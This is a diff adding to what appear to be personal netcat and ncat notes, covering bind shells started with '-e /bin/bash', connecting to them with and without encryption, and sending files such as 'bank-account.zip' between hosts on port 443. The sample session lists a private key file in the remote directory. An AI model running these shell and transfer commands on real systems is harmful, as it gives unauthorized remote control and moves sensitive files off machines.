@@ -19,6 +19,33 @@ nc -nv 127.0.0.1 1234 > sample.txt
 
 ######################################
 
+3) Execute file upon connection:
+(this uses encryption)
+ncat -nlvp 1234 -e /bin/bash
+
+(this does not use encryption)
+nc -nlvp 1234 -e /bin/bash
+listening on [any] 1234 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 47562
+
+(connect to remote with/out encryption)
+nc -nv 127.0.0.1 1234
+(UNKNOWN) [127.0.0.1] 1234 (?) open
+dir
+Desktop    Downloads  Pictures        Public     Videos
+Documents  Music      privatekey.pem  Templates
+###############
+(listener with encryption)
+ncat -vlp 1234
+
+(connect with encryption)
+ncat -vv 127.0.0.1 1234 -e /bin/bash
+
+
+
+
+
+
 nc -l -p 443 < C:\bank-account.zip --from machine that has the file, this one is windows.
 
 nc -w3 192.168.31.201 443 > C:\bank-account.zip
